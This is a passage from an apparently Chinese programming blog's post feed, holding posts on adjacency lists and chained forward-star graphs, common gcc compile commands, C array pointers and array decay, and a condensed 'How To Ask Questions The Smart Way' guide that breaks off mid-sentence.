class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;path&gt;\ADT_AdjacencyList.exe</span><br><span class="line">6 7</span><br><span class="line">1 2 7</span><br><span class="line">1 3 1</span><br><span class="line">1 4 2</span><br><span class="line">2 4 2</span><br><span class="line">3 6 4</span><br><span class="line">4 5 8</span><br><span class="line">5 6 2</span><br><span class="line">Vertex number: 6</span><br><span class="line">Edge number: 7</span><br><span class="line">Weighted: Yes</span><br><span class="line">1: 4(2) 3(1) 2(7)</span><br><span class="line">2: 4(2)</span><br><span class="line">3: 6(4)</span><br><span class="line">4: 5(8)</span><br><span class="line">5: 6(2)</span><br><span class="line">6: ^</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链式前向星</title>
      <link href="/2023-12-28-7696f4abaecb/"/>
      <url>/2023-12-28-7696f4abaecb/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li>静态链表</li><li>邻接表(最好了解原理)</li></ol><h1 id="概述">概述</h1><p>与<code>前向星</code>不同,<code>链式前向星</code>无需排序操作,效率相对较高.</p><p>链式前向星实际就是静态建立的<code>邻接表</code>,或者说是用数组模拟(静态链表)实现的邻接表,因此代码实现非常简单.</p><p>链式前向星兼顾了前向星的简便和邻接表的高效,尽管应用不广泛,但是在OI竞赛中备受青睐.</p><h1 id="原理">原理</h1><h2 id="存储结构">存储结构</h2><p>需要2个数组,<code>int head[];</code>和<code>struct Edge edge[];</code>,分别存储表头和所有的边.</p><p>由于链式前向星本质是静态链表,因此需要一个<code>edge[]</code>数组来存储图中所有的边,根据输入顺序,edge[i]为输入的第i条边<code>&lt;ui,vi,wi&gt;</code>.</p><p>对每一条边而言,都存储4个数据<code>u,v,w,next</code>,分别为这条边的<code>起点,终点,权值,下一条边的下标(edge中)</code>.其中<code>下一条边的下标</code>就类似于邻接表中的<code>指向下一条边的指针</code>,只不过这里使用静态链表实现.</p><p>然后,和邻接表一样,需要一个数组<code>head[]</code>作为表头,其中<code>head[i]</code>为一个下标,指向以i为起点的第1条出边.当没有这样的一条边时,即顶点i的出度为0,<code>head[i]</code>可以赋值为-1,代表没有下一条边了,类似NULL指针.</p><h2 id="初始化">初始化</h2><p>输入n,m为图的点数,边数.head[]长度为n,edge[]长度为m.根据实现可多出1个空间以忽略0下标.</p><p><code>head[]</code>全部初始化为-1,代表当前所有的顶点都没有出边,即目前为空图.</p><h2 id="插入边">插入边</h2><p>采用头插法进行插入,每个head[i]就是一个(静态的)链表.</p><p>读入第i条边的信息<code>&lt;ui,vi,wi&gt;</code>,到<code>edge[i]</code>.</p><p>根据ui找到head[ui],即以ui为起点的边集链表,将第一条边的下标<code>head[ui]</code>赋值给<code>edge[i].next</code>,即让第i条边的下一条边指向当前的<code>edge[head[ui]]</code>这条边.当指向的下标为-1时代表着到达链表尾部.</p><p>将<code>i</code>赋值给<code>head[ui]</code>,即头插法,将新增的边i插入到链表头,即后输入的边在链表的头,先输入的边则在尾部,与输入相反.</p><p>依次插入m条边后,链式前向星即建立完成,就是这么简单.</p><h1 id="代码示例">代码示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x7FFFFFFF</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> to, w, next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> <span class="title">edge</span>[500003];</span></span><br><span class="line"><span class="type">int</span> head[<span class="number">100003</span>], n, m, cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> from;</span><br><span class="line">    <span class="comment">// 读入u,v,w</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[++cnt].to;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[cnt].w;</span><br><span class="line">edge[cnt].next = head[from];</span><br><span class="line">head[from] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;输入点数和边数:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;<span class="comment">//n为点数,m为边数</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;依次输入边(起始 终点 权值):&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">addEdge(); <span class="comment">// 读入一条边</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = head[i]; j; j = edge[j].next) &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;--(&quot;</span>&lt;&lt;edge[j].w&lt;&lt;<span class="string">&quot;)--&gt;&quot;</span>&lt;&lt;edge[j].to&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">init();</span><br><span class="line">print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构及算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc编译常用命令</title>
      <link href="/2023-12-23-d7d0d898d653/"/>
      <url>/2023-12-23-d7d0d898d653/</url>
      
        <content type="html"><![CDATA[<h1 id="gcc编译流程">gcc编译流程</h1><p>预处理-&gt;编译-&gt;汇编-&gt;链接</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231223162315433.png" alt="image-20231223162315433" style="zoom:50%;" /><h1 id="常用编译参数">常用编译参数</h1><table><thead><tr><th>gcc选项</th><th>作用</th></tr></thead><tbody><tr><td>-o</td><td>对<code>.i</code>,<code>.s</code>,<code>.o</code>,<code>可执行文件</code>等生成目标文件</td></tr><tr><td>-E</td><td>只对源程序进行预处理,即只生成<code>.i</code>文件后就停止编译,结果输出到<code>标准输出</code>,需要使用<code>&gt;</code>写入指定文件</td></tr><tr><td>-S</td><td>只生成<code>.s</code>汇编文件后就停止编译</td></tr><tr><td>-c</td><td>只编译源程序,不对编译后产生的目标代码进行链接</td></tr><tr><td>-I</td><td>后跟目录,将该目录加入搜索头文件的目录路径</td></tr><tr><td>-L</td><td>后跟目录,将该目录加入搜索库的目录路径</td></tr><tr><td>-l</td><td>链接lib库</td></tr><tr><td>-g</td><td>在目标文件中嵌入调试信息,以便<code>gdb</code>工具对程序进行调试,及用于生成带有调试信息的程序</td></tr></tbody></table><h1 id="举例">举例</h1><p>仅预处理:</p><p><code>gcc -E main.c &gt; main.i</code></p><br><p>生成汇编代码:</p><p><code>gcc -S main.c</code></p><br><p>仅编译不进行链接:</p><p><code>gcc -c main.s -o main.o</code></p><br><p>使用.o文件生成可执行目标程序</p><p><code>gcc main.o -o main</code></p><p>或者 <code>gcc -o main main.c</code></p><br><p>指定搜索头文件和链接库的目录</p><p><code>gcc -o main main.c -I /home/main/include -L /home/main/lib -lworld</code></p><p><code># -lworld表示在上面的lib路径中寻找libworld.so动态库文件</code></p><p><code># 如果gcc编译选项加入了-static,则表示寻找libworld.a静态库文件</code></p><br><p>单文件编译</p><p>现有 main.c</p><p>编译命令:</p><p><code>gcc main.c -o main</code></p><p><code># 如果为windows平台,则将目标文件改为main.exe即可</code></p><br><p>多文件编译</p><p>现有 main.c hello.c hello.h</p><p>编译命令:</p><p><code>gcc main.c hello.c -o main</code></p><p>或者将.c文件单独编译:</p><p><code>gcc -c hello.c -o hello.o</code></p><p><code>gcc -c main.c -o main.o</code></p><p><code>gcc hello.o main.o -o main</code></p><br><p>参考:<a href="https://zhuanlan.zhihu.com/p/513148985">https://zhuanlan.zhihu.com/p/513148985</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_3-初探指针和数组的关系</title>
      <link href="/2023-12-23-7cb717142d36/"/>
      <url>/2023-12-23-7cb717142d36/</url>
      
        <content type="html"><![CDATA[<p>上一篇涉及<code>指针指向的数据类型的大小</code>,有没有一种可能,数组也是一种数据类型,那么一个数组有多大呢?</p><p>前置知识:</p><ol><li>指针类型和指针运算</li><li>一维数组</li><li>sizeof的使用</li></ol><h1 id="数组的大小">数组的大小</h1><p>C语言提供的<code>数组</code>用于存储特定个数的相同类型元素,每个元素都有着相同的大小(占用的字节数),数组作为一个整体,当然也有着其大小,显然,数组的大小==元素的大小*数组元素的个数.</p><p>例如有<code>int a[10];</code>数组的元素为int类型,占用4个字节(<code>sizeof(int)</code>),那么整个数组a就占用40个字节(<code>sizeof(a)</code>):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 使用大括号初始化, 未初始化的元素默认为0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>, <span class="keyword">sizeof</span>(a)); <span class="comment">// 40</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为40,说明数组的总长度就是所有元素加起来的总长度.</p><h1 id="使用指针来访问数组">使用指针来访问数组</h1><p>// 正在施工……</p><h1 id="数组名的退化问题">数组名的退化问题</h1><p>该问题十分重要,<s>其实也可以认为是C语言的一个设计缺陷.</s></p><p>我们在使用一个指针来访问数组的时候,例如遍历一个数组,需要对指针进行赋值,经常可以发现有2种写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">// 我们在使用一个指针来访问数组的时候,例如遍历一个数组,需要对指针进行赋值,一般标准的写法是:</span></span><br><span class="line">    <span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 但是我们也可以使用一种简单的写法:</span></span><br><span class="line">    <span class="type">int</span> *q = a;</span><br><span class="line">    <span class="comment">// 这是因为数组名a就是一个指针,指向数组的第一个元素,所以我们可以直接使用a来进行赋值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为数组名a就是一个指针,指向数组的第一个元素,既然是&quot;指向数组的第一个元素&quot;,那么其类型自然就是<code>int *</code>,所以我们可以直接使用表达式<code>a</code>来进行赋值.</p><p>a本来是一个数组,但是将数组名用于表达式求值时,其代表的是<code>数组首元素的地址</code>,那么它的类型就是<code>指向数组元素类型的指针</code>,而不是指代整个数组.因此,在上面的例子中可以直接使用<code>a</code>来初始化<code>q</code>.</p><p>这就是<code>数组名的退化问题</code>,它会&quot;退化&quot;为指向其首元素的指针.不仅是在这种情景,包括函数传参也会发生.</p><h1 id="数组指针">数组指针</h1><p>既然数组也是一种复合的数据类型,那么自然可以(应该)有一种指针可以指向一个数组.也就是<code>数组指针</code>,亦即<code>(指向)数组(的)指针</code>.</p><h2 id="声明数组指针">声明数组指针</h2><p>若我们有一个<code>int a[5];</code>则使用如下方式声明并初始化一个数组指针指向a:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a;</span><br></pre></td></tr></table></figure><p>由于下标运算符<code>[]</code>的优先级比指针运算符<code>*</code>高(当然这里的各个运算符是用于声明的,而不是表达式求值),因此为了说明p是一个指针,需要使用括号<code>()</code>来改变优先级.</p><p>首先<code>(*p)</code>说明p是一个指针,接下来就是确定p指向什么类型的变量.因为我们要让p能够指向a,也就是一个长度为5的int数组,所以p指向的类型应该是<code>int [5]</code>,而根据C语言的声明语法,<code>[5]</code>应该放到标识符p的后面,所以最终的声明就是<code>int (*p)[5]</code>.</p><p>需要注意,这个长度需要给出,因为编译器需要确定指向的数组究竟有多长(见<code>指针指向的数据类型的大小</code>一节),否则这个声明将会是一个<code>不完整的类型</code>,后续会给出例子.</p><p>这个声明指出,p是一个指向长度为5的int数组的指针.如果这样不够清晰,换个语序:</p><p>p是一个指针,它指向的数据类型为&quot;长度为5的int数组&quot;.</p><h2 id="解引用数组指针">解引用数组指针</h2><p>既然p是指向数组的指针,那么对p解引用的结果自然就是一个特定长度的数组,注意这个长度必须给出.</p><p>看一个例子,使用一个数组指针遍历数组的各个元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 看一个例子,使用一个数组指针遍历数组的各个元素</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (*p)[i]); <span class="comment">// *p就是a,因为[]的优先级高于*,所以要加括号</span></span><br><span class="line">        <span class="comment">// printf(&quot;%d &quot;,a[i]); // 也可以直接用a[i]来访问,和上面的等价</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// (*p)[i]和*p[i]完全不同,前者是访问p指向的数组的第i个元素;后者则是访问p+i指向的元素,</span></span><br><span class="line">    <span class="comment">// 即整个数组a后面的第i个数组,这个数组是不存在的,所以发生了越界访问</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须注意的是,<code>(*p)[i]</code>和<code>*p[i]</code>完全不同,前者是访问p指向数组的第i个元素;后者则是访问p+i指向的元素,即整个数组a后面的&quot;第i个数组&quot;,这个数组是不存在的,所以会发生越界访问.</p><h2 id="数组指针指向二维数组的每一行">数组指针指向二维数组的每一行</h2><p>如果a不是一个一维数组,而是一个二维数组,那么可以使用一个(一维)数组指针指向a的每一行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 数组指针指向二维数组的每一行</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>&#125;,</span><br><span class="line">                   &#123;<span class="number">5</span>, <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">                   &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">4</span>] = a; <span class="comment">// p指向a的第一行,这里a作为表达式,会退化为指向第一行(第一个元素)的指针</span></span><br><span class="line">    <span class="comment">// int (*p)[4] = &amp;a[0]; // 与上面等价</span></span><br><span class="line">    <span class="comment">// 每一行都是一个长度为4的一维数组,所以p是一个指向长度为4的一维数组的指针</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (*p)[j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++; <span class="comment">// 指向下一行,p的值实际上加了4个int的长度,即16</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>p++</code>让p指向下一个数组,也就是说,p的值足足增加了16,因为p指向的数组总大小为<code>4*sizeof(int)</code>也就是16个字节.</p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提问的艺术-简洁版</title>
      <link href="/2023-12-21-31a9f2f41c52/"/>
      <url>/2023-12-21-31a9f2f41c52/</url>
      
        <content type="html"><![CDATA[<p>PS:主要面向群聊.</p><p>摘自:<a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/">https://lug.ustc.edu.cn/wiki/doc/smart-questions/</a></p><h1 id="在提问之前">在提问之前</h1><p>当你打算通过群聊/论坛/电子邮件提出技术问题时,请确保做到以下事情:</p><ol><li>尝试在该论坛的旧文章中搜索答案.</li><li>尝试上网搜索答案(使用谷歌/必应等搜索引擎).</li><li>尝试查找相关文档以找到答案.</li><li>向朋友打听答案.</li><li>自行思考尝试分析解决.</li></ol><p>当你提出问题时,请先表明你已经做了上面的事情,树立一个<code>自己不是不劳而获,并且不会浪费他人时间</code>的提问者人设是最首要的一步.并且,回答者往往更加愿意帮助那些<code>更喜欢从解决问题中学到知识</code>的人.</p><p>在使用搜索引擎的时候,请使用一些策略,尝试使用简短且更为关键的词语进行搜索,并在提问时给出你的努力(搜索过程),也许你的问题换一个搜索方式就可以了.</p><p>准备好你的发言,一个草率的提问只会得到草率的回答,甚至引来嘲讽(这在技术圈子里很正常),你越能表现出你自己对这个问题的努力,就越有可能得到帮助.</p><p>别问错问题,如果你的问题基于错误的假设,某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>,一边用无意义的字面解释来答复你,希望着你会从问题的回答中汲取教训.</p><p>绝不要自以为<code>够格</code>得到答案,你没有；你并没有.毕竟你没有为这种服务支付<code>任何报酬</code>.你将会是自己去<strong>挣到</strong>一个答案,靠提出有内涵的、有趣的、有思维激励作用的问题.</p><p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p><h1 id="当你提问时">当你提问时</h1><p>注意选择场合,否则你很有可能被忽略或者被看做失败者:</p><ul><li>在与主题无关的场合(群聊/论坛等)提问.</li><li>在进阶/专业的论坛提出初级的问题,反之亦然.</li><li>向没有任何义务与理由解决你的问题的人发送私人消息.</li></ul><p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p><p>因此,第一步是找到对的论坛.Google 和其它搜索引擎还是你的朋友,用它们来找到与你遭遇到困难的软硬件问题最相关的网站.通常各种网站都有自己的FAQ等,也许你能够找到帮助.</p><p>确定你的问题主题,不要在无关的场合提一个其他方面的问题—在一个软件开发的群聊提一个如何修电脑的问题看起来很傻(除非有人感兴趣).</p><h1 id="使用有意义的标题">使用有意义的标题</h1><p>使用关键信息来吸引专家的注意力,而不是使用诸如<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>、<code>救命啊！！！！</code>这样令人反感的字眼,一般没人关心你的急迫.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231221132857564.png" alt="image-20231221132857564" style="zoom:50%;" /><h1 id="精确地描述问题">精确地描述问题</h1><p>注意,在解决一个根本性的问题之前,你可能自己找到了一些步骤,并且卡在了这些步骤.</p><p>允许的话,请给出你原始的问题,并将你查找到的解决步骤也一并提出,因为你卡住的步骤也许根本就是错误的甚至毫无意义.</p><p>另外,在问题描述中,请:</p><ul><li>仔细、清楚地描述你的问题或 Bug 的症状。</li><li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li><li>描述在提问前你是怎样去研究和理解这个问题的。</li><li>描述在提问前为确定问题而采取的诊断步骤。</li><li>描述最近做过什么可能相关的硬件或软件变更。</li><li>尽可能地提供一个可以<code>重现这个问题的可控环境</code>的方法。</li></ul><h1 id="不要低声下气-也不要高高在上">不要低声下气,也不要高高在上</h1><p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p><p>礼多人不怪，而且有时还很有帮助.没人不喜欢礼貌的聊天,彬彬有礼,对他人保持礼貌,让大家都知道你对他们花时间免费提供帮助心存感激.</p><p>另外,比较建议的是,事前道谢,不代表解决后可以不再进行任何回复感谢,在问题解决后,记得回复道谢.</p><h1 id="不该问的问题">不该问的问题</h1><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p><blockquote><p>问题：我能在哪找到 X 程序或 X 资源？</p></blockquote><p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="https://www.google.com/">Google</a> 吗？</p><blockquote><p>问题：我怎样用 X 做 Y？</p></blockquote><p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p><blockquote><p>问题：如何设定我的 shell 提示？？</p></blockquote><p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/#RTFM">RTFM</a>，然后自己去找出来。</p><blockquote><p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？</p></blockquote><p>回答：试试看就知道了。如果你试过，你就知道了答案，就不用浪费我的时间了。</p><blockquote><p>问题：我的{程序/设定/SQL 语句}没有用</p></blockquote><p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p><ul><li>你还有什么要补充的吗？</li><li>真糟糕，希望你能搞定。</li><li>这关我屁事？</li></ul><blockquote><p>问题：我的 Windows 电脑有问题，你能帮我吗？</p></blockquote><p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p><p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题，只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p><blockquote><p>问题：我的程序不会动了，我认为系统工具 X 有问题</p></blockquote><p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p><blockquote><p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p></blockquote><p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a href="http://www.linux.org/groups/index.html">这儿</a>找到用户群组的清单）。</p><p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地用户群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p><blockquote><p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p></blockquote><p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p><h1 id="如何更好地回答问题">如何更好地回答问题</h1><p><strong>态度和善一点。</strong> 问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p><strong>对初犯者私下回复。</strong> 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p><p><strong>如果你不确定，一定要说出来！</strong> 一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p><strong>如果帮不了忙，也别妨碍他。</strong> 